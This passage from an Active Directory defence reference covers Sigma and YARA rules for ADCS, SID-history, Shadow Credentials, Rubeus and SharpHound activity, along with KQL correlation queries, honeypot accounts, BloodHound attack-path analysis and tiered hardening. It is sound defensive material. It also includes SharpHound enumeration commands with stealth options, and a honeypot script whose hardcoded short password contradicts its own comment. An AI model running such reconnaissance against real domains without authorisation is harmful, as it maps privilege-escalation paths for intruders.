> **Prerequisite.** Enable "Audit Directory Service Changes" (subcategory) at the DC level. By default, 5136/5137 events are not generated unless this audit subcategory is enabled via `auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable`.

**Rule 5 — ADCS abuse indicators (ESC1–ESC8 composite).**

The inline rule in §9 detects ESC1 (SAN enrollment). This composite rule covers the broader set of ADCS abuse indicators across ESC1–ESC8 by monitoring certificate enrollment events (4886, 4887, 4888) and template modification events (4899, 4900).

```yaml
title: ADCS Abuse — Suspicious Certificate Operations (ESC1–ESC8 Composite)
id: be7f6d5c-4a8e-4b0c-d9e1-6f5a0b7c8d4e
status: stable
description: >
    Composite detection for ADCS abuse patterns. Covers: certificate requests
    with SAN (ESC1), enrollment in templates with Any Purpose EKU (ESC2),
    enrollment agent certificate requests (ESC3), template ACL modification
    (ESC4), CA object permission changes (ESC5-7), and HTTP enrollment
    endpoint access without EPA (ESC8 relay indicator).
references:
    - https://posts.specterops.io/certified-pre-owned-d95910965cd2
    - https://attack.mitre.org/techniques/T1649/
    - §9 — ADCS attacks
author: Security Library
date: 2026/05/13
tags:
    - attack.credential_access
    - attack.privilege_escalation
    - attack.t1649
logsource:
    product: windows
    service: security
detection:
    esc1_san_enrollment:
        EventID: 4887
        CertificateTemplateName|contains:
            - 'User'
            - 'Machine'
            - 'WebServer'
        SubjectAlternativeName|contains: '@'
    esc2_any_purpose:
        EventID: 4887
        CertificateTemplateName|contains:
            - 'SubCA'
            - 'CrossCA'
    esc3_enrollment_agent:
        EventID: 4887
        CertificateTemplateName|contains: 'EnrollmentAgent'
    esc4_template_modification:
        EventID:
            - 4899
            - 4900
    esc8_http_enrollment:
        EventID: 4886
        # HTTP enrollment without channel binding (IIS log correlation required)
    condition: 1 of esc*
level: high
falsepositives:
    - Legitimate certificate enrollment by PKI administrators
    - Automated certificate lifecycle management tools (e.g., Certbot for ADCS)
    - Template modifications during planned PKI maintenance windows
```

> **Coverage gap.** Event IDs 4886/4887 require "Audit Certification Services" to be enabled on the CA. Many organizations do not audit this subcategory. Verify with: `auditpol /get /subcategory:"Certification Services" /r`. If not enabled: `auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable`.

**Rule 6 — AdminSDHolder ACL modification via directory change audit.**

The inline rule in §2.2 uses Event 4662. This rule uses the more granular Event 5136 (directory service object modification) to capture the specific DACL change on AdminSDHolder, including the new ACE value.

```yaml
title: AdminSDHolder — Security Descriptor Modification (5136)
id: cf8a7e6d-5b9f-4c1d-eaf2-7a6b1c8d9e5f
status: stable
description: >
    Detects modification of the security descriptor (nTSecurityDescriptor)
    on the AdminSDHolder object via directory change auditing (Event 5136).
    AdminSDHolder's ACL propagates every 60 minutes to all protected objects
    (Domain Admins, Enterprise Admins, Schema Admins, etc.) via SDProp.
    Any modification outside planned change windows is a persistence indicator.
references:
    - https://attack.mitre.org/techniques/T1078/002/
    - §2.2 — AdminSDHolder
author: Security Library
date: 2026/05/13
tags:
    - attack.persistence
    - attack.defense_evasion
    - attack.t1078.002
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        ObjectDN|contains: 'CN=AdminSDHolder,CN=System'
        AttributeLDAPDisplayName: 'nTSecurityDescriptor'
    condition: selection
level: critical
falsepositives:
    - Legitimate AD hardening that tightens AdminSDHolder ACL
    - AD migration tools that modify protected object security descriptors
```

**Rule 7 — SID history injection via replication or direct modification.**

The inline rule in §2.1 detects SID history changes. This enhanced rule differentiates between SID history added via directory modification (5136) and SID history injected via DCShadow replication (4662 with specific attribute), and flags any SID history containing well-known privileged SID patterns.

```yaml
title: SID History Injection — Privileged SID Added to User Object
id: d09b8f7e-6c0a-4d2e-fba3-8b7c2d9eaf60
status: stable
description: >
    Detects SID history modifications where the added SID matches known
    privileged group patterns (Domain Admins -512, Enterprise Admins -519,
    Schema Admins -518, Administrators -544). Covers both direct attribute
    modification (5136) and replication-based injection indicators (4662).
references:
    - https://attack.mitre.org/techniques/T1134/005/
    - §2.1 — SID history injection
author: Security Library
date: 2026/05/13
tags:
    - attack.privilege_escalation
    - attack.persistence
    - attack.t1134.005
logsource:
    product: windows
    service: security
detection:
    selection_direct:
        EventID: 5136
        AttributeLDAPDisplayName: 'sIDHistory'
        OperationType: '%%14674'  # Value Added
    selection_replication:
        EventID: 4662
        Properties|contains: 'sIDHistory'
        AccessMask: '0x100'  # Control Access
    filter_privileged_sids:
        AttributeValue|re: '.*-(512|518|519|544)$'
    condition: (selection_direct or selection_replication) and filter_privileged_sids
level: critical
falsepositives:
    - Domain migration using ADMT with SID history preservation (planned)
    - Forest trust SID filtering disabled for legacy application compatibility
```

**Rule 8 — Shadow Credentials msDS-KeyCredentialLink write (enhanced with source context).**

The inline rule in §6 detects basic KeyCredentialLink modifications. This enhanced version captures the source account context and flags writes from non-privileged accounts that should not have this capability.

```yaml
title: Shadow Credentials — msDS-KeyCredentialLink Write from Non-Privileged Source
id: e1ac9a8f-7d1b-4e3f-0cb4-9c8d3eaf1b71
status: stable
description: >
    Detects writes to msDS-KeyCredentialLink where the source account is not
    a privileged identity management system (ADFS, Azure AD Connect, Windows
    Hello for Business provisioning). Shadow Credentials (§6) abuse this
    attribute to add attacker-controlled keys, enabling PKINIT authentication
    as the target without knowing their password.
references:
    - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
    - https://attack.mitre.org/techniques/T1556/007/
    - §6 — Shadow Credentials
author: Security Library
date: 2026/05/13
tags:
    - attack.credential_access
    - attack.persistence
    - attack.t1556.007
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
        OperationType: '%%14674'  # Value Added
    filter_whb_provisioning:
        SubjectUserName|contains:
            - 'AZUREADSSOACC'
            - 'MSOL_'
            - 'AADConnect'
            - 'WHfBProvisioning'
    filter_adfs:
        SubjectUserName|contains: 'ADFS'
    condition: selection and not filter_whb_provisioning and not filter_adfs
level: critical
falsepositives:
    - Windows Hello for Business key provisioning
    - Azure AD Connect password writeback
    - ADFS device registration service
```

### 11.2 YARA rules — AD attack tool signatures

These YARA rules target AD-specific offensive tools. Chapter 14B §7.2 covers Mimikatz, Nanodump, HandleKatz, Exchange transport agents, and Cobalt Strike. The rules below cover BloodHound/SharpHound collectors, Rubeus, and Certify — tools exclusively used for AD attacks.

**BloodHound / SharpHound collector.**

```yara
rule SharpHound_Collector
{
    meta:
        description = "Detects SharpHound (BloodHound data collector) binaries and in-memory artifacts"
        date = "2026-05-13"
        reference = "§12 — AD Attack Path Analysis"
        severity = "high"
        hash_example = "sharphound compiled .NET assembly"

    strings:
        $s1 = "SharpHound" ascii wide nocase
        $s2 = "BloodHound" ascii wide nocase
        $s3 = "Sharphound.json" ascii wide
        $s4 = "CollectionMethodOptions" ascii
        $s5 = "IngestTask" ascii
        $s6 = "LdapQueryParameters" ascii
        $s7 = "OutputWriter" ascii
        $s8 = "SessionEnumeration" ascii
        $s9 = "GroupMembershipCollection" ascii
        $s10 = "LocalAdminCollection" ascii
        $s11 = "ACLProcessor" ascii
        $s12 = "ComputerAvailability" ascii
        $ns1 = "SharpHound3" ascii
        $ns2 = "Sharphound.Client" ascii
        $ns3 = "Sharphound.Runtime" ascii

    condition:
        uint16(0) == 0x5A4D and (4 of ($s*) or 2 of ($ns*))
}
```

**SharpHound output artifacts (JSON/ZIP).**

```yara
rule SharpHound_Output_Files
{
    meta:
        description = "Detects SharpHound output files (JSON collections or ZIP bundles)"
        date = "2026-05-13"
        reference = "BloodHound data ingestion format"
        severity = "medium"

    strings:
        $json_meta = "\"meta\":" ascii
        $json_methods = "\"CollectionMethods\":" ascii
        $json_type_computers = "\"computers\":" ascii
        $json_type_users = "\"users\":" ascii
        $json_type_groups = "\"groups\":" ascii
        $json_type_domains = "\"domains\":" ascii
        $json_type_sessions = "\"sessions\":" ascii
        $bh_version = "\"version\":" ascii
        $bh_primary_label = "\"PrimaryLabel\":" ascii
        $zip_sharphound = "BloodHound" ascii
        $file_naming = /\d{14}_BloodHound\.(zip|json)/ ascii

    condition:
        (4 of ($json*) and $bh_primary_label) or
        ($zip_sharphound and $file_naming)
}
```

**Rubeus.**

```yara
rule Rubeus_Binary
{
    meta:
        description = "Detects Rubeus Kerberos attack tool — binary and in-memory"
        date = "2026-05-13"
        reference = "§1 — Kerberos attack extensions"
        severity = "critical"

    strings:
        $s1 = "Rubeus" ascii wide nocase
        $s2 = "asreproast" ascii wide
        $s3 = "kerberoast" ascii wide
        $s4 = "s4u" ascii wide
        $s5 = "createnetonly" ascii wide
        $s6 = "ptt" ascii wide
        $s7 = "tgtdeleg" ascii wide
        $s8 = "triage" ascii wide
        $s9 = "harvest" ascii wide
        $s10 = "Interop.LsaStringWrapper" ascii
        $s11 = "KRB_CRED" ascii
        $s12 = "Roast.GetASRepHash" ascii
        $s13 = "LSA.ExtractTicket" ascii
        $ns1 = "Rubeus.Commands" ascii
        $ns2 = "Rubeus.Domain" ascii
        $ns3 = "Rubeus.lib.Interop" ascii

    condition:
        uint16(0) == 0x5A4D and (5 of ($s*) or 2 of ($ns*))
}
```

**Certify (ADCS enumeration and abuse).**

```yara
rule Certify_ADCS_Tool
{
    meta:
        description = "Detects Certify and ForgeCert ADCS exploitation tools"
        date = "2026-05-13"
        reference = "§9 — ADCS attacks"
        severity = "high"

    strings:
        $c1 = "Certify" ascii wide nocase
        $c2 = "ForgeCert" ascii wide nocase
        $c3 = "CertificateAuthority" ascii
        $c4 = "EnrollmentAgentRestriction" ascii
        $c5 = "IssuancePolicyInfo" ascii
        $c6 = "DVPRIV" ascii
        $c7 = "VulnerableTemplateACL" ascii
        $c8 = "ESC1" ascii
        $c9 = "ESC2" ascii
        $c10 = "ENROLLEE_SUPPLIES_SUBJECT" ascii
        $c11 = "pKIExtendedKeyUsage" ascii
        $c12 = "CertRequest.CertRequest" ascii
        $ns1 = "Certify.Commands" ascii
        $ns2 = "Certify.Domain" ascii
        $ns3 = "Certify.Lib" ascii

    condition:
        uint16(0) == 0x5A4D and (4 of ($c*) or 2 of ($ns*))
}
```

### 11.3 Windows Event Log correlation patterns

Effective AD attack detection requires correlating multiple event sources. This subsection provides correlation chains beyond what individual Sigma rules capture.

**4769 + 4768 chain — Kerberoasting to lateral movement.**

When an attacker Kerberoasts an SPN, cracks the password, then uses the compromised account:
1. **Event 4769** (TGS requested) with etype 0x17 (RC4) for the target SPN — the roasting event.
2. **Event 4768** (TGT requested) for the SPN's underlying account — the attacker authenticating with cracked credentials.
3. **Event 4624** (logon) Type 3 or Type 10 from an unexpected source — lateral movement using the compromised account.

Correlation query (KQL):
```kql
let kerberoast_events = SecurityEvent
| where EventID == 4769
    and TicketEncryptionType == "0x17"
    and ServiceName !endswith "$"
    and ServiceName != "krbtgt"
| summarize TGS_Count = dcount(ServiceName), SPNs = make_set(ServiceName)
    by IpAddress, bin(TimeGenerated, 5m)
| where TGS_Count >= 5;
let compromised_accounts = kerberoast_events
| mv-expand SPNs to typeof(string)
| join kind=inner (
    SecurityEvent
    | where EventID == 4768
    | project TGT_Time = TimeGenerated, TargetUserName, IpAddress
) on $left.SPNs == $right.TargetUserName
| where TGT_Time between (TimeGenerated .. TimeGenerated + 24h);
compromised_accounts
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType in (3, 10)
) on TargetUserName
| project TimeGenerated, TargetUserName, IpAddress, LogonType, WorkstationName
```

**5136 chain — directory change forensics.**

Event ID 5136 is the most valuable single event for AD persistence detection. Key attributes to monitor:

| Attribute modified | Attack technique | Reference |
|--------------------|-----------------|-----------|
| `nTSecurityDescriptor` on AdminSDHolder | AdminSDHolder persistence | §2.2 |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD delegation abuse | §5.2 |
| `msDS-KeyCredentialLink` | Shadow Credentials | §6 |
| `sIDHistory` | SID history injection | §2.1 |
| `servicePrincipalName` | Targeted Kerberoasting setup | §1.2 |
| `userAccountControl` (bit 4194304) | AS-REP Roasting weaponization | §1.1 |
| `member` on privileged groups | Direct privilege escalation | §4 |
| `msPKI-Certificate-Name-Flag` on templates | ADCS ESC1 enabling | §9.1 |
| `nTSecurityDescriptor` on domain root | ACL persistence | §4.3 |

Correlation query for 5136 monitoring (PowerShell):
```powershell
# Collect all 5136 events from the past 24 hours on DCs
$events = Get-WinEvent -FilterHashtable @{
    LogName     = 'Security'
    Id          = 5136
    StartTime   = (Get-Date).AddHours(-24)
} -ComputerName DC01, DC02

# Parse and filter for high-value attribute changes
$suspicious = $events | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $data = @{}
    $xml.Event.EventData.Data | ForEach-Object { $data[$_.Name] = $_.'#text' }
    [PSCustomObject]@{
        TimeCreated   = $_.TimeCreated
        ObjectDN      = $data['ObjectDN']
        AttributeName = $data['AttributeLDAPDisplayName']
        OperationType = $data['OperationType']
        SubjectUser   = $data['SubjectUserName']
        NewValue      = $data['AttributeValue']
    }
} | Where-Object {
    $_.AttributeName -in @(
        'nTSecurityDescriptor', 'msDS-AllowedToActOnBehalfOfOtherIdentity',
        'msDS-KeyCredentialLink', 'sIDHistory', 'servicePrincipalName',
        'userAccountControl', 'member', 'msPKI-Certificate-Name-Flag',
        'msPKI-Enrollment-Flag', 'msPKI-RA-Signature'
    )
}

$suspicious | Sort-Object TimeCreated | Format-Table -AutoSize
```

**4662 — replication rights access audit.**

Event 4662 with the three replication GUIDs forms the foundation for DCSync detection. Additional 4662 patterns:

| Access GUID | Right | Abuse scenario |
|-------------|-------|----------------|
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes | DCSync (§7.1) |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All | DCSync — includes confidential attributes |
| `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set | DCSync — filtered attribute set |
| `00299570-246d-11d0-a768-00aa006e0529` | User-Force-Change-Password | ForceChangePassword abuse (§4.1) |
| `ab721a53-1e2f-11d0-9819-00aa0040529b` | User-Change-Password | Password change (may be benign) |
| `bf9679c0-0de6-11d0-a285-00aa003049e2` | Self-Membership | AddSelf to group (§4.1) |

### 11.4 Honeypot accounts and deception

Deception-based detection provides high-confidence alerts with near-zero false positives. AD honeypots exploit the fact that attackers must enumerate the directory to identify targets.

**Fake SPN accounts for Kerberoasting detection.**

Create service accounts with SPNs that appear valuable (SQL admin, backup operator, service desk) but are not used by any real service. Any TGS request for these SPNs is definitively malicious — no legitimate system requests tickets for unused services.

```powershell
# Create honeypot SPN account
New-ADUser -Name "svc_sqlbackup" `
    -SamAccountName "svc_sqlbackup" `
    -UserPrincipalName "svc_sqlbackup@domain.local" `
    -Description "SQL Backup Service Account — Production DB01" `
    -AccountPassword (ConvertTo-SecureString "K3rb3r0ast!Th1s#2026" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true `
    -Path "OU=Service Accounts,DC=domain,DC=local"

# Set a tempting SPN
Set-ADUser -Identity "svc_sqlbackup" `
    -ServicePrincipalNames @{Add="MSSQLSvc/DB01.domain.local:1433"}

# Ensure the password is strong enough to resist cracking — the goal is
# detection, not compromise. A 25+ character random password with AES
# encryption makes cracking infeasible while still triggering the TGS request.
Set-ADAccountControl -Identity "svc_sqlbackup" -DoesNotRequirePreAuth $false

# Add fake group membership to increase attractiveness during enumeration
Add-ADGroupMember -Identity "Backup Operators" -Members "svc_sqlbackup"
```

Detection rule for honeypot SPN access:
```yaml
title: Honeypot SPN — TGS Request for Deception Service Account
id: f2bd0b9a-8e2c-4f40-1dc5-0d9e4fb0c8e6
status: stable
description: >
    Detects any TGS ticket request targeting a known honeypot SPN. These SPNs
    are not associated with real services; any request is definitively
    attacker reconnaissance or Kerberoasting.
references:
    - §11.4 — Honeypot accounts and deception
author: Security Library
date: 2026/05/13
tags:
    - attack.credential_access
    - attack.discovery
    - attack.t1558.003
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        ServiceName:
            - 'svc_sqlbackup'
            - 'svc_exchservice'
            - 'svc_adfsadmin'
            # Add all honeypot SPN account names
    condition: selection
level: critical
falsepositives: []  # By design, no legitimate access should occur
```

**Canary DACL entries for ACL enumeration detection.**

Place specific ACEs on high-value objects that grant benign read permissions to a honeypot account. BloodHound/SharpHound enumerate ACLs comprehensively; the canary entries themselves do not grant meaningful access but their presence in collected data triggers when an attacker evaluates attack paths.

```powershell
# Create canary group
New-ADGroup -Name "IT-Delegation-Review" `
    -GroupScope DomainLocal `
    -GroupCategory Security `
    -Path "OU=Groups,DC=domain,DC=local" `
    -Description "IT delegation review group — quarterly access audit"

# Add canary DACL entry to Domain Admins object
# This grants ReadProperty on a benign attribute to the canary group
$daPath = "AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local"
$acl = Get-Acl $daPath
$identity = New-Object System.Security.Principal.NTAccount("domain\IT-Delegation-Review")
$adRight = [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty
$accessType = [System.Security.AccessControl.AccessControlType]::Allow
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $identity, $adRight, $accessType, $inheritanceType
)
$acl.AddAccessRule($ace)
Set-Acl $daPath $acl
```

When BloodHound data shows `IT-Delegation-Review` with edges to `Domain Admins`, an analyst can search for the principal who collected this data — that principal enumerated ACLs on Domain Admins, a strong indicator of reconnaissance.

**Honeypot computer account for RBCD detection.**

Create a computer account with `msDS-AllowedToActOnBehalfOfOtherIdentity` writable by a visible but benign account. Any modification to this attribute is an RBCD attack attempt:

```powershell
# Create honeypot computer
New-ADComputer -Name "FILE03" `
    -SamAccountName "FILE03$" `
    -Description "File server — Finance department" `
    -Path "OU=Servers,DC=domain,DC=local" `
    -Enabled $true

# Set writable RBCD attribute from a canary service account
$fileServer = Get-ADComputer "FILE03"
$canaryAccount = Get-ADUser "svc_sqlbackup"
Set-ADComputer $fileServer -PrincipalsAllowedToDelegateToAccount $canaryAccount

# Monitor Event 5136 for any changes to msDS-AllowedToActOnBehalfOfOtherIdentity
# on FILE03 — any modification is suspicious
```

---

## 12. AD Attack Path Analysis

Attack path analysis identifies chains of AD misconfigurations and excessive permissions that allow an attacker to escalate from a low-privilege foothold to Domain Admin. This analysis is both an offensive technique (attackers use it to plan escalation) and a defensive practice (defenders use it to find and remediate dangerous paths before exploitation).

### 12.1 BloodHound Community Edition (CE)

BloodHound CE is the current generation of the BloodHound attack path mapping tool, replacing the legacy BloodHound 4.x desktop application. It runs as a containerized web application backed by a Neo4j graph database, with SharpHound (Windows) and AzureHound (Azure AD) as data collectors.

**Architecture.**

| Component | Role |
|-----------|------|
| BloodHound CE API server | Graph queries, path analysis, risk scoring |
| Neo4j 5.x | Graph database storing AD objects and relationships |
| SharpHound | .NET collector — enumerates AD objects, ACLs, sessions, local groups |
| AzureHound | Go collector — enumerates Azure AD/Entra ID objects and role assignments |
| PostgreSQL | Metadata, job state, user management |

**Deployment (Docker Compose):**
```bash
curl -L https://ghst.ly/getbhce | docker compose -f - up -d
# Default: http://localhost:8080
# Initial password displayed in container logs
docker compose -f - logs bloodhound | grep "Initial Password"
```

**SharpHound collection methods and flags.**

```
# Full collection — all methods (noisy, triggers logon events across all computers)
SharpHound.exe --collectionmethods All --zipfilename full_collection.zip

# Stealthy collection — LDAP only (no computer access, no session enum)
SharpHound.exe --collectionmethods DCOnly --zipfilename dc_only.zip

# Targeted collection with specific domain and DC
SharpHound.exe --collectionmethods Group,ACL,ObjectProps,Trusts \
    --domain domain.local --domaincontroller DC01.domain.local \
    --zipfilename targeted.zip

# Session collection only (requires SMB access to targets)
SharpHound.exe --collectionmethods Session --zipfilename sessions.zip \
    --computerfile target_servers.txt

# Loop session collection (re-collect sessions every 15 minutes for 2 hours)
SharpHound.exe --collectionmethods Session --loop --loopinterval 00:15:00 \
    --loopduration 02:00:00
```

Collection method reference:

| Method | Data collected | Access required | Noise level |
|--------|---------------|-----------------|-------------|
| `Default` | Group memberships, local admins, sessions, trusts, ACLs, object properties | Domain user + SMB | Medium |
| `All` | Default + GPO local groups, DCOM, RDP, PSRemote, SPNs, containers | Domain user + SMB + RPC | High |
| `DCOnly` | Groups, trusts, ACLs, object properties (LDAP only) | Domain user | Low |
| `Session` | Active logon sessions on computers | Domain user + SMB | Medium |
| `ACL` | All DACLs on AD objects | Domain user | Low |
| `ObjectProps` | User/computer properties (UAC flags, SPNs, descriptions, etc.) | Domain user | Low |
| `Group` | Group memberships (nested) | Domain user | Low |

### 12.2 Common dangerous attack paths

BloodHound reveals chains of permissions that individually appear benign but together provide a path to Domain Admin. The most frequently encountered dangerous paths:

**Path 1: GenericAll → ForceChangePassword → Domain Admin.**

```
User A --[GenericAll]--> User B --[MemberOf]--> Domain Admins
```
An attacker controlling User A can reset User B's password (GenericAll includes all rights, including ForceChangePassword), then authenticate as User B to gain DA.

Remediation: Remove GenericAll ACE from User A on User B. If delegation is required, grant only the specific rights needed (e.g., `ReadProperty` for monitoring, `WriteProperty` on specific attributes for management).

**Path 2: WriteDACL → DCSync.**

```
User A --[WriteDACL]--> Domain Root --[DCSync]--> All credentials
```
WriteDACL on the domain root allows adding an ACE granting DS-Replication-Get-Changes-All, which enables DCSync (§7.1).

Remediation: Audit and remove all WriteDACL grants on the domain root that are not DC machine accounts or built-in administrators. Query:
```powershell
(Get-Acl "AD:\DC=domain,DC=local").Access |
    Where-Object { $_.ActiveDirectoryRights -match 'WriteDacl' } |
    Select-Object IdentityReference, AccessControlType, IsInherited |
    Sort-Object IdentityReference
```

**Path 3: AddMember → Domain Admins (direct).**

```
User A --[AddMember]--> Domain Admins
```
AddMember permission on the Domain Admins group allows directly adding any account.

Remediation: Only Domain Admins should have AddMember on Domain Admins. Remove any delegated AddMember rights. The AdminSDHolder mechanism (§2.2) should protect this, but custom ACEs added after SDProp runs can persist until the next cycle.

**Path 4: Owns → WriteDACL → GenericAll chain.**

```
User A --[Owns]--> Group X --[WriteDACL]--> User B --[GenericAll]--> DC01$
```
Object ownership grants implicit WriteDACL. This chain is frequently missed because ownership is not visible in standard permission views.

**Path 5: RBCD chain via machine account quota.**

```
User A --[Creates]--> EVIL$ (machine account, §5.1)
         --[WriteMsDs-AllowedToActOnBehalfOfOtherIdentity]--> Target Server
         --[S4U2Self + S4U2Proxy]--> Service ticket as admin on Target Server
```
This is the RBCD attack (§5.2) expressed as a BloodHound path. Remediation: set `ms-DS-MachineAccountQuota` to 0 (§5.1).

### 12.3 Tier 0 asset identification methodology

Tier 0 assets are those whose compromise leads to full domain compromise. Identifying them is the first step in tiered administration (§13.1).

**Definition.** A Tier 0 asset is any AD object that:
1. Can directly read or modify all domain credentials (DCs, DCSync-capable accounts).
2. Can modify Tier 0 objects (WriteDACL, WriteOwner, GenericAll on DCs or domain root).
3. Is a transitive dependency of items 1–2 (GPOs linked to DC OU, ADCS CAs that can issue DC certificates, Azure AD Connect servers).

**Automated Tier 0 discovery (BloodHound CE Cypher query):**
```cypher
// Find all principals with a path to Domain Admins
MATCH p=shortestPath((n)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE n <> g
RETURN n.name, n.objectid, length(p) AS hops
ORDER BY hops ASC
```

```cypher
// Find all principals that can DCSync
MATCH (n)-[:GetChanges|GetChangesAll*1..2]->(d:Domain)
WHERE NOT n:Domain
RETURN n.name, n.objectid, labels(n)
```

```cypher
// Find all principals with GenericAll/WriteDACL/WriteOwner on DCs
MATCH (n)-[r:GenericAll|WriteDacl|WriteOwner]->(c:Computer)
WHERE c.unconstraineddelegation = true OR c.name CONTAINS "DC"
RETURN n.name, type(r), c.name
```

**Manual Tier 0 inventory checklist:**

| Asset category | Examples | Verification method |
|---------------|----------|-------------------|
| Domain Controllers | DC01, DC02, RODC01 | `Get-ADDomainController -Filter *` |
| DA/EA/SA members | Domain Admins, Enterprise Admins, Schema Admins | `Get-ADGroupMember -Recursive` |
| DCSync-capable accounts | Accounts with replication rights | §7.1 PowerShell audit |
| ADCS Certificate Authorities | Enterprise CA, Subordinate CA | `certutil -config - -ping` |
| Azure AD Connect server | AADC01 | `Get-ADSyncConnector` |
| PAW/Tier 0 management workstations | YOURPAW01 | Organizational policy |
| GPOs linked to DC OU | Default Domain Controllers Policy | `Get-GPInheritance -Target "OU=Domain Controllers,DC=domain,DC=local"` |
| ADFS servers | ADFS01 | `Get-AdfsFarmInformation` |

### 12.4 Automated reporting — PlumHound and GoodHound

**PlumHound** generates automated reports from BloodHound data by executing predefined Cypher queries and exporting results to HTML, CSV, or Markdown.

```bash
# Install
git clone https://github.com/PlumHound/PlumHound.git
cd PlumHound && pip install -r requirements.txt

# Run default task set against BloodHound Neo4j
python PlumHound.py -s "bolt://localhost:7687" \
    -u neo4j -p bloodhound \
    --task default.tasks \
    --path ./reports/

# Custom task: find all Kerberoastable users with paths to DA
python PlumHound.py -s "bolt://localhost:7687" \
    -u neo4j -p bloodhound \
    --query "MATCH (u:User {hasspn:true}), \
             p=shortestPath((u)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) \
             RETURN u.name, u.serviceprincipalnames, length(p) AS hops \
             ORDER BY hops ASC" \
    --title "Kerberoastable Users with Path to DA"
```

**GoodHound** analyzes BloodHound data to produce risk-scored attack path reports, prioritizing remediation by impact.

```bash
pip install goodhound
goodhound -s "bolt://localhost:7687" -u neo4j -p bloodhound \
    --output-format html --output-path ./goodhound_report.html
```

### 12.5 Attack path remediation prioritization framework

Not all attack paths are equal. Prioritize remediation using this framework:

| Priority | Criteria | Action | SLA |
|----------|----------|--------|-----|
| P0 — Critical | Direct path from any user to DA in ≤2 hops | Immediate remediation | 24 hours |
| P1 — High | Path from any user to DA in ≤4 hops, OR path to Tier 0 asset | Remediation in current sprint | 7 days |
| P2 — Medium | Path from any user to DA in ≤6 hops, OR Kerberoastable user with DA path | Scheduled remediation | 30 days |
| P3 — Low | Longer paths, or paths requiring multiple compromises | Backlog | 90 days |

Remediation actions ranked by effectiveness:
1. **Remove the ACE** — eliminates the edge entirely.
2. **Change object ownership** — removes implicit WriteDACL from Owns edges.
3. **Disable account** — if the source account is unnecessary.
4. **Reduce group membership** — remove users from overprivileged groups.
5. **Set `ms-DS-MachineAccountQuota` to 0** — eliminates RBCD via machine account creation.
6. **Enable Protected Users** — prevents credential caching for high-value accounts (§13.2).
7. **Deploy LAPS** — prevents local admin password reuse for lateral movement (§3).

---

## 13. AD Hardening Reference

This section provides implementation-level hardening guidance. It complements the detection engineering in §11 and the attack path remediation in §12.

### 13.1 Tiered administration model

The tiered administration model (also called the Enterprise Access Model) segments administrative access to prevent credential exposure across trust boundaries. Compromise of a lower tier should not grant access to a higher tier.

| Tier | Assets | Access scope |
|------|--------|-------------|
| **Tier 0** | Domain Controllers, AD database, ADCS CAs, Azure AD Connect, Enterprise/Domain/Schema Admins, PAM trusts | Full domain control |
| **Tier 1** | Member servers, applications, databases, SCCM, Exchange (on-prem) | Server administration |
| **Tier 2** | Workstations, user devices, helpdesk access | Endpoint management |

**Implementation with Authentication Policies and Silos (Windows Server 2012 R2+).**

Authentication Policies restrict where accounts can authenticate (TGT issuance) and Authentication Silos bind accounts to specific policies, enforcing tier boundaries at the Kerberos protocol level.

```powershell
# Step 1: Create Authentication Policy for Tier 0
New-ADAuthenticationPolicy -Name "Tier0-Policy" `
    -Description "Restricts Tier 0 accounts to authenticate only to Tier 0 assets" `
    -UserTGTLifetimeMins 60 `
    -ComputerTGTLifetimeMins 60 `
    -ServiceTGTLifetimeMins 60 `
    -UserAllowedToAuthenticateFrom (
        New-ADAuthenticationPolicyCriteria -Data "O:SYG:SYD:(XA;OICI;CR;;;WD;(@USER.ad://ext/AuthenticationSilo == `"Tier0-Silo`"))"
    ) `
    -Enforce

# Step 2: Create Authentication Policy for Tier 1
New-ADAuthenticationPolicy -Name "Tier1-Policy" `
    -Description "Restricts Tier 1 accounts to Tier 1 and below" `
    -UserTGTLifetimeMins 240 `
    -Enforce

# Step 3: Create Authentication Silo for Tier 0
New-ADAuthenticationPolicySilo -Name "Tier0-Silo" `
    -Description "Silo for Domain Admins, DC machine accounts, and Tier 0 service accounts" `
    -UserAuthenticationPolicy "Tier0-Policy" `
    -ComputerAuthenticationPolicy "Tier0-Policy" `
    -ServiceAuthenticationPolicy "Tier0-Policy" `
    -Enforce

# Step 4: Assign accounts to the silo
$tier0Accounts = Get-ADGroupMember -Identity "Domain Admins" -Recursive |
    Where-Object { $_.objectClass -eq 'user' }
foreach ($account in $tier0Accounts) {
    Set-ADUser -Identity $account -AuthenticationPolicySilo "Tier0-Silo"
    Grant-ADAuthenticationPolicySiloAccess -Identity "Tier0-Silo" -Account $account
}

# Step 5: Assign DC machine accounts to the silo
$dcs = Get-ADDomainController -Filter *
foreach ($dc in $dcs) {
    Set-ADComputer -Identity $dc.Name -AuthenticationPolicySilo "Tier0-Silo"
    Grant-ADAuthenticationPolicySiloAccess -Identity "Tier0-Silo" -Account $dc.ComputerObjectDN
}

# Step 6: Verify enforcement
Get-ADAuthenticationPolicySilo -Identity "Tier0-Silo" | Select-Object Name, Enforce, Members
Get-ADAuthenticationPolicy -Identity "Tier0-Policy" | Select-Object Name, Enforce
```

> **Prerequisite.** Domain functional level must be Windows Server 2012 R2 or higher. Claims-based access control must be supported by all DCs.

### 13.2 Protected Users group

The Protected Users security group (Windows Server 2012 R2+) provides non-configurable credential protection for its members:

| Protection | Effect |
|-----------|--------|
| No NTLM authentication | Prevents PtH attacks |
| No DES or RC4 in Kerberos preauthentication | Forces AES, prevents AS-REP/Kerberoasting with weak etypes |
